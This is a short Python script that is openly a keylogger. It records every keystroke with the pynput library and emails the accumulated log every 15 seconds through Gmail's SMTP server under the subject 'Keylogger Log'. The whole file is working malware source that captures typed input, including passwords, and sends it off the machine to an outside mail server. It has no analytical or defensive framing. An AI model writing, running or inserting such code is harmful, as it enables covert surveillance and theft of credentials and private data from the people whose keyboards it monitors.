from pynput import keyboard
import smtplib
import threading

log = ""
email = "************@gmail.com"
password = "***************" 

interval = 15  # seconds

def send_email(subject, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, f"Subject: {subject}\n\n{message}")
        server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")

def write_and_send():
    global log
    if log:
        send_email("Keylogger Log", log)
        log = ""
    timer = threading.Timer(interval, write_and_send)
    timer.start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f"[{key}]"

with keyboard.Listener(on_press=on_press) as listener:
    write_and_send()
    listener.join()
